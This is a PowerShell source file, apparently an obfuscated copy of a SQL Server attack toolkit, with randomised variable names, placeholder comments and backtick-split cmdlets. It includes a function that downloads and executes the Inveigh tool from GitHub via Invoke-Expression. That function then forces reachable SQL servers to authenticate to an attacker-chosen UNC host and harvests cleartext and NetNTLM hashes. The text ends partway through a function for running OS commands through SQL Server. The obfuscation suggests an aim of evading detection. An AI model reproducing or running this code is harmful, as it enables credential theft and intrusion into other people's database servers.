# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLConnectionObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$PeckLively,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$CakeFine = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$BabyKettle = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$SealGrip = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$KneelBuzz = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace = 1
    )

    Begin
    {
        # Microsoft".
        if($PuffyCrack)
        {
            $OvalBelief = 'ADMIN:'
        }
        else
        {
            $OvalBelief = ''
        }

        # Microsoft".
        if(-not $PeckLively)
        {
            $PeckLively = 'Master'
        }

        # Microsoft".
        if($CakeFine){
            $SteadyLunch = ";Application Name=`"$CakeFine`""
        }else{
            $SteadyLunch = ""
        }

        # Microsoft".
        if($BabyKettle){
            $FemaleRipe = ";Workstation Id=`"$BabyKettle`""
        }else{
            $FemaleRipe = ""
        }

        # Microsoft".
        if($SealGrip){
            $SettleLoad = ";Encrypt=Yes"
        }else{
            $SettleLoad = ""
        }

        # Microsoft".
        if($KneelBuzz){
            $UglyCactus = ";TrustServerCertificate=Yes"
        }else{
            $UglyCactus = ""
        }
    }

    Process
    {
        # Microsoft".
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $ExtendSmelly = ne`w`-ob`je`ct -TypeName System.Data.SqlClient.SqlConnection

        # Microsoft".
        if(-not $AnimalWeary){

            # Microsoft".
            $PluckyClass = "Current Windows Credentials"

            # Microsoft".
            $ExtendSmelly.ConnectionString = "Server=$OvalBelief$Instance;Database=$PeckLively;Integrated Security=SSPI;Connection Timeout=$StitchFace$SteadyLunch$SettleLoad$UglyCactus$FemaleRipe"
        }
        
        # Microsoft".
        if ($AnimalWeary -like "*\*"){
            $PluckyClass = "Provided Windows Credentials"

            # Microsoft".
            $ExtendSmelly.ConnectionString = "Server=$OvalBelief$Instance;Database=$PeckLively;Integrated Security=SSPI;uid=$AnimalWeary;pwd=$EasyAlert;Connection Timeout=$StitchFace$SteadyLunch$SettleLoad$UglyCactus$FemaleRipe"
        }

        # Microsoft".
        if (($AnimalWeary) -and ($AnimalWeary -notlike "*\*")){

            # Microsoft".
            $PluckyClass = "Provided SQL Login"

            # Microsoft".
            $ExtendSmelly.ConnectionString = "Server=$OvalBelief$Instance;Database=$PeckLively;User ID=$AnimalWeary;Password=$EasyAlert;Connection Timeout=$StitchFace$SteadyLunch$SettleLoad$UglyCactus$FemaleRipe"
        }

        # Microsoft".
        return $ExtendSmelly
    }

    End
    {
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLConnectionTest
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$ManMute,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$BoneSeat,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$PeckLively,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('Status')
    }

    Process
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        # Microsoft".
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        if($BoneSeat -and $ManMute)
        {
            if ($ManMute.Contains(","))
            {
                $SquealBat = $false
                foreach ($SticksSour in $ManMute.Split(","))
                {
                    if($(Test-Subnet -DependStingy $BoneSeat -SticksSour $SticksSour))
                    {
                        $SquealBat = $true
                    }
                }
                if (-not $SquealBat)
                {
                    Write-Warning "Skipping $HauntGusty ($ManMute)"
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Out of Scope')
                    return
                }
            }

            if(-not $(Test-Subnet -DependStingy $BoneSeat -SticksSour $ManMute))
            {
                Write-Warning "Skipping $HauntGusty ($ManMute)"
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Out of Scope')
                return
            }
            Write-Verbose "$HauntGusty ($ManMute)"
        }

        # Microsoft".
        if($PuffyCrack)
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace -PeckLively $PeckLively
        }
        else
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace -PeckLively $PeckLively
        }

        # Microsoft".
        try
        {
            # Microsoft".
            $ExtendSmelly.Open()

            if(-not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Microsoft".
            $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Accessible')

            # Microsoft".
            $ExtendSmelly.Close()

            # Microsoft".
            $ExtendSmelly.Dispose()
        }
        catch
        {
            # Microsoft".
            if(-not $RaggedQuill)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Microsoft".
            $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Microsoft".
        $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLConnectionTestThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$ManMute,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$BoneSeat,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$PeckLively,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('Status')

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance;
            }
        }

        if($Instance -and $ManMute)
        {
            $BeefSpy | Add-Member -Name "IPAddress" -RayPlucky $ManMute
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            # Microsoft".
            $Instance = $_.Instance
            $ManMute = $_.IPAddress

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            if($BoneSeat -and $ManMute)
            {
                if ($ManMute.Contains(","))
                {
                    $SquealBat = $false
                    foreach ($SticksSour in $ManMute.Split(","))
                    {
                        if($(Test-Subnet -DependStingy $BoneSeat -SticksSour $SticksSour))
                        {
                            $SquealBat = $true
                        }
                    }
                    if (-not $SquealBat)
                    {
                        Write-Warning "Skipping $HauntGusty ($ManMute)"
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Out of Scope')
                        return
                    }
                }

                if(-not $(Test-Subnet -DependStingy $BoneSeat -SticksSour $ManMute))
                {
                    Write-Warning "Skipping $HauntGusty ($ManMute)"
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Out of Scope')
                    return
                }
                Write-Verbose "$HauntGusty ($ManMute)"
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace -PeckLively $PeckLively
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace -PeckLively $PeckLively
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Accessible')

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLQuery
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$BoringLarge,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$PeckLively,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$CakeFine = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$BabyKettle = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$SealGrip = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$KneelBuzz = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$RuralRing
    )

    Begin
    {
        # Microsoft".
        $LiveEnjoy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        if($PuffyCrack)
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace -PuffyCrack -PeckLively $PeckLively -CakeFine $CakeFine -BabyKettle $BabyKettle -SealGrip $SealGrip -KneelBuzz $KneelBuzz
        }
        else
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace -PeckLively $PeckLively -CakeFine $CakeFine -BabyKettle $BabyKettle -SealGrip $SealGrip -KneelBuzz $KneelBuzz
        }

        # Microsoft".
        $MissThread = $ExtendSmelly.Connectionstring
        $Instance = $MissThread.split(';')[0].split('=')[1]

        # Microsoft".
        if($BoringLarge)
        {
            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $SoakSame = ne`w`-ob`je`ct -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($BoringLarge, $ExtendSmelly)

                # Microsoft".
                $FlyCruel = $SoakSame.ExecuteReader()

                # Microsoft".
                $LiveEnjoy.Load($FlyCruel)

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".
                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($RuralRing)
                {
                    $ErrorMessage = $_.Exception.Message
                    # Microsoft".
                }
            }
        }
        else
        {
            Write-CrazyChief -PencilFlight 'No query provided to Get-SQLQuery function.'
            Break
        }
    }

    End
    {
        # Microsoft".
        if($RuralRing)
        {
            $ErrorMessage
        }
        else
        {
            $LiveEnjoy
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLQueryThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$PeckLively,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Query to be executed.')]
        [String]$BoringLarge,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace -PeckLively $PeckLively
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace -PeckLively $PeckLively
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $SoakSame = ne`w`-ob`je`ct -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($BoringLarge, $ExtendSmelly)

                # Microsoft".
                $FlyCruel = $SoakSame.ExecuteReader()

                # Microsoft".
                $TradeSpicy.Load($FlyCruel)

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}

# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLUncPathInjection {


    [CmdletBinding()]
    Param(
      [Parameter(Mandatory=$false)]
       [string]$AnimalWeary,
    
       [Parameter(Mandatory=$false)]
       [string]$EasyAlert,

       [Parameter(Mandatory=$false)]
       [string]$AcidicChalk,

       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
       HelpMessage = 'SQL Server instance to connection to.')]
       [string]$Instance,

       [Parameter(Mandatory=$true)]
       [string]$ScrubShade,

       [Parameter(Mandatory=$false)]
       [int]$StitchFace = 5,

       [Parameter(Mandatory=$false)]
       [int]$ItchyJuice = 10

    )

    Begin 
    {
        # Microsoft".
        try {
            inv`oke`-ex`pre`s`s`ion -SoakSame (ne`w`-ob`je`ct -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1') -ErrorAction Stop
            Write-Verbose "Inveigh loaded"
        } catch {
            $ErrorMessage = $_.Exception.Message
            Write-Verbose "$ErrorMessage"

            # Microsoft".
            $EagerGate = Test-Path -Path Function:\Invoke-Inveigh
            if($EagerGate -eq 'True')
            {
                Write-Verbose "Inveigh loaded."
            }else{
                Write-Verbose "Inveigh NOT loaded. Ensure Inveigh is loaded."
                break
            }
        }

        # Microsoft".
        $WinterAlert = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $WinterAlert.Columns.Add('Cleartext')
        $null = $WinterAlert.Columns.Add('NetNTLMv1')
        $null = $WinterAlert.Columns.Add('NetNTLMv2')
    }

    Process
    {

        # Microsoft".
        # Microsoft".
        $HotSour = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $SquareHouses = ne`w`-ob`je`ct -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($HotSour)                        
        $CurlySlow = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $JumpySoothe = $SquareHouses.IsInRole($CurlySlow)
        if (-not $JumpySoothe)
        {
            Write-Verbose -Message "You do not have Administrator rights. Run this function in a privileged process for best results."                            
        }
        else
        {
            Write-Verbose -Message "You have Administrator rights."
                          
        }

        # Microsoft".
        if(-not $Instance)
        {
            # Microsoft".
            $SteepCheap = Get-SQLInstanceDomain -verbose -AcidicChalk $AcidicChalk -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert 
        } else {
            # Microsoft".
            $SteepCheap = $Instance 
        }

        # Microsoft".
        Write-Verbose -Message "Attempting to log into each instance..."
        $InjureEscape = $SteepCheap | Get-SQLConnectionTestThreaded -Verbose -ItchyJuice $ItchyJuice | ? {$_.status -eq "Accessible"}        
        $UnableThrone = $InjureEscape.count

        # Microsoft".
        Write-Verbose -Message "$UnableThrone SQL Server instances can be logged into"
        Write-Verbose -Message "Starting UNC path injections against $UnableThrone instances..."

        # Microsoft".
        Write-Verbose -Message "Starting Invoke-Inveigh..."
        Invoke-Inveigh -NBNS Y -MachineAccounts Y -SticksSour $ScrubShade | Out-Null

        # Microsoft".
        $InjureEscape | 
        ForEach-Object{

            # Microsoft".
            $FlashyCrowd = $_.Instance

            # Microsoft".
            $SticksQuince = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

            # Microsoft".
            Write-Verbose -Message "$FlashyCrowd - Injecting UNC path to \\$ScrubShade\$SticksQuince"

            # Microsoft".
            # Microsoft".

            # Microsoft".
            $FirstStage = Get-SQLServerInfo -Instance $FlashyCrowd -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($FirstStage)
            {
                $PlantsPlants = $FirstStage.Split('.')[0]
            }

            # Microsoft".
            if([int]$PlantsPlants -le 11)
            {
                Get-SQLQuery -Instance $FlashyCrowd -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -BoringLarge "BACKUP LOG [TESTING] TO DISK = '\\$ScrubShade\$SticksQuince'" -RaggedQuill | out-null
                Get-SQLQuery -Instance $FlashyCrowd -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -BoringLarge "BACKUP DATABASE [TESTING] TO DISK = '\\$ScrubShade\$SticksQuince'" -RaggedQuill | out-null
            }

            # Microsoft".
            Get-SQLQuery -Instance $FlashyCrowd -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -BoringLarge "xp_dirtree '\\$ScrubShade\$SticksQuince'" -RaggedQuill | out-null 
            Get-SQLQuery -Instance $FlashyCrowd -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -BoringLarge "xp_fileexist '\\$ScrubShade\$SticksQuince'" -RaggedQuill | out-null
   
            # Microsoft".
            sleep $StitchFace

            # Microsoft".
            Get-Inveigh -LikeCub | Sort-Object |
            ForEach-Object {
                Write-Verbose -Message " - Cleartext: $_"
            }

            Get-Inveigh -CarvePress | Sort-Object |
            ForEach-Object {
                Write-Verbose -Message " - NetNTLMv1: $_"
            }

            Get-Inveigh -MarketExtend | Sort-Object |
            ForEach-Object {
                Write-Verbose -Message " - NetNTLMv2: $_"
            }
        }
    }

    End
    {

            # Microsoft".
            Get-Inveigh -LikeCub | Sort-Object |
            ForEach-Object {
                
                # Microsoft".
                [string]$CarvePress = ""
                [string]$MarketExtend = ""
                [string]$LikeCub = $_
                $null = $WinterAlert.Rows.Add([string]$LikeCub, [string]$CarvePress, [string]$MarketExtend)            
            }

            # Microsoft".
            Get-Inveigh -CarvePress | Sort-Object |
            ForEach-Object {
                
                # Microsoft".
                [string]$CarvePress = $_
                [string]$MarketExtend = ""
                [string]$LikeCub = ""
                $null = $WinterAlert.Rows.Add([string]$LikeCub, [string]$CarvePress, [string]$MarketExtend)            
            }

            # Microsoft".
            Get-Inveigh -MarketExtend | Sort-Object |
            ForEach-Object {
                
                # Microsoft".
                [string]$CarvePress = ""
                [string]$MarketExtend = $_
                [string]$LikeCub = ""
                $null = $WinterAlert.Rows.Add([string]$LikeCub, [string]$CarvePress, [string]$MarketExtend)            
            }

        # Microsoft".
        Clear-Inveigh | Out-Null

        # Microsoft".
        Stop-Inveigh | Out-Null
        
        # Microsoft".
        $WinterAlert

    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmd
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$OpenRepairQueue
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('CommandResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
